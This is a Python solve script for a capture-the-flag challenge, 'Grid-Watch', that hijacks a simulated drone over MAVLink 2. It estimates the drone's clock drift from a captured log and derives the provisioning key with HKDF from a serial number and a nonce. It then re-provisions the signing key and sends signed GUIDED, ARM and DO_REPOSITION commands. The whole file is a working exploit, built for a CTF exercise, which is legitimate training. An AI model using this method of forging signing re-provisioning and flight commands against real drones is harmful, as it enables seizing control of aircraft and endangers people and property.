#!/usr/bin/env python3
"""
CSCTF 2026 - Grid-Watch (network/hard)

Forge a MAVLink 2 signed reposition command the drone accepts:

  1. Calibrate the airframe RTC from capture.tlog. Pairing each tlog
     record timestamp (us) with the packet's 48-bit signing timestamp
     (10 us ticks) gives a constant slope of 100001.7 ticks/s, i.e.
     +17 ppm, and
         signing_ticks = round((unix_time - 1733965123) * 100001.7)
     with commissioning epoch 1733965123 (2024-12-12 00:58:43 UTC).
     Validated live: this predicts the drone's signing timestamps at
     connect time to within the network latency.

  2. Derive the provisioning key exactly as in provisioning_note.md:
         prov_key = HKDF-SHA256(
             ikm  = b"CX-FALCON-9951" || uint64_le(1733965123),
             salt = bytes.fromhex(<PROV NONCE announced at connect>),
             info = b"CX-PROV/v1", L = 32)

  3. In one TCP connection: send SETUP_SIGNING (msg 256) carrying a new
     session key of our choice, initial_timestamp = its own signature
     timestamp, the packet signed with prov_key (link_id 249, source
     255/190 as in the capture). The drone answers
     "signing re-provisioned: new key active".

  4. Signed with the new key, in the normal flight order:
     COMMAND_LONG 176 (DO_SET_MODE, param1=1, param2=4 = GUIDED),
     COMMAND_LONG 400 (ARM, param1=1),
     COMMAND_LONG 192 (DO_REPOSITION, param5/6/7 = lat/lon/alt).
     The drone replies with a STATUSTEXT containing the flag.

Every signed packet uses a fresh RTC timestamp (monotonically
increasing), so nothing is a replay of the capture.

Requires: pymavlink (common dialect, for message packing / CRC extras).

Usage:
    python3 solve.py [host] [port]
"""

import hashlib
import hmac
import io
import socket
import struct
import sys
import time

from pymavlink.dialects.v20 import common as m

HOST = sys.argv[1] if len(sys.argv) > 1 else "w02.ctf.chronos-security.ro"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32773

EPOCH = 1733965123          # commissioning epoch, seconds (from the fit)
RATE_TICKS_PER_SEC = 100001.7   # nominal 100000 ticks/s, +17 ppm
LINK_ID = 249               # link_id used by the GCS in capture.tlog
SERIAL = b"CX-FALCON-9951"  # serial from the drone's STATUSTEXT


def hkdf_sha256(ikm, salt, info, length=32):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, counter = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        okm += t
        counter += 1
    return okm[:length]


def rtc_ticks():
    return int(round((time.time() - EPOCH) * RATE_TICKS_PER_SEC))


def crc_accumulate(data, crc=0xFFFF):
    for b in data:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ ((tmp << 4) & 0xFF)) & 0xFF
        crc = ((crc >> 8) ^ ((tmp << 8) & 0xFFFF) ^
               ((tmp << 3) & 0xFFFF) ^ (tmp >> 4)) & 0xFFFF
    return crc


def build_signed(msg, key, timestamp, seq=0):
    """Pack a MAVLink 2 message and append a signing signature (13 B):
    link_id, 48-bit timestamp (10 us ticks, LE), SHA256-48 over
    key || packet (incl. CRC) || link_id || timestamp."""
    dummy = m.MAVLink(io.BytesIO(), srcSystem=255, srcComponent=190)
    packed = msg.pack(dummy)
    payload_len = packed[1]
    payload = packed[10:10 + payload_len]
    header = (struct.pack("<BBBBBBB", 0xFD, payload_len, 1, 0, seq, 255, 190)
              + msg.get_msgId().to_bytes(3, "little"))
    crc = crc_accumulate(header[1:] + payload)
    crc = crc_accumulate(bytes([msg.crc_extra]), crc)
    packet = header + payload + struct.pack("<H", crc)
    signature = hashlib.sha256(
        key + packet + bytes([LINK_ID]) + timestamp.to_bytes(6, "little")
    ).digest()[:6]
    return packet + bytes([LINK_ID]) + timestamp.to_bytes(6, "little") + signature


def parse_stream(data):
    msgs, off = [], 0
    while off + 10 <= len(data):
        if data[off] != 0xFD:
            break
        payload_len = data[off + 1]
        incompat = data[off + 2]
        msgid = data[off + 7] | (data[off + 8] << 8) | (data[off + 9] << 16)
        payload = data[off + 10:off + 10 + payload_len]
        pos = off + 10 + payload_len + 2
        if incompat & 1:
            pos += 13  # skip signature
        msgs.append((msgid, payload))
        off = pos
    return msgs


def recv_for(sock, seconds):
    sock.settimeout(0.3)
    end, buf = time.time() + seconds, b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            pass
    return buf


def main():
    sock = socket.create_connection((HOST, PORT), timeout=5)
    msgs = parse_stream(recv_for(sock, 1.0))
    nonce_hex = None
    for msgid, payload in msgs:
        if msgid == 253 and b"PROV NONCE" in payload:
            nonce_hex = payload[1:].split(b"\x00")[0].decode().split()[-1]
    if nonce_hex is None:
        raise SystemExit("no PROV NONCE announced by the drone")
    print(f"[*] session nonce: {nonce_hex}")

    prov_key = hkdf_sha256(SERIAL + struct.pack("<Q", EPOCH),
                           bytes.fromhex(nonce_hex), b"CX-PROV/v1")
    new_key = hashlib.sha256(b"gridwatch-session-key-v1").digest()
    print(f"[*] prov_key: {prov_key.hex()}")

    state = {"last_ts": 0, "seq": 0}

    def receive(label):
        replies = parse_stream(recv_for(sock, 2.5))
        for msgid, payload in replies:
            if msgid == 253:
                text = payload[1:].split(b"\x00")[0].decode(errors="replace")
                print(f"[{label}] STATUSTEXT: {text}")
            elif msgid == 0:
                mode = struct.unpack("<I", payload[:4])[0]
                print(f"[{label}] HEARTBEAT custom_mode={mode}")
            elif msgid == 77:
                print(f"[{label}] COMMAND_ACK payload={payload.hex()}")
        return replies

    def send(msg, label, key):
        ts = max(rtc_ticks(), state["last_ts"] + 1)
        state["last_ts"] = ts
        sock.sendall(build_signed(msg, key, ts, state["seq"]))
        state["seq"] += 1
        print(f">>> {label} (ts={ts})")
        return receive(label)

    # 1. Re-provision signing: initial_timestamp == signature timestamp.
    ts = rtc_ticks()
    state["last_ts"] = ts
    sock.sendall(build_signed(
        m.MAVLink_setup_signing_message(1, 1, new_key, ts),
        prov_key, ts, state["seq"]))
    state["seq"] += 1
    print(f">>> SETUP_SIGNING (ts={ts})")
    receive("SETUP_SIGNING")

    # 2. GUIDED, arm, reposition -- all signed with the new key.
    send(m.MAVLink_command_long_message(1, 1, 176, 0, 1, 4, 0, 0, 0, 0, 0),
         "DO_SET_MODE GUIDED", new_key)
    send(m.MAVLink_command_long_message(1, 1, 400, 0, 1, 0, 0, 0, 0, 0, 0),
         "ARM", new_key)
    replies = send(m.MAVLink_command_long_message(
        1, 1, 192, 0, 0, 0, 0, 0, 45.6, 24.1, 100),
        "DO_REPOSITION", new_key)

    for msgid, payload in replies:
        if msgid == 253 and b"CSCTF{" in payload:
            print(payload[1:].split(b"\x00")[0].decode())
            break
    sock.close()


if __name__ == "__main__":
    main()
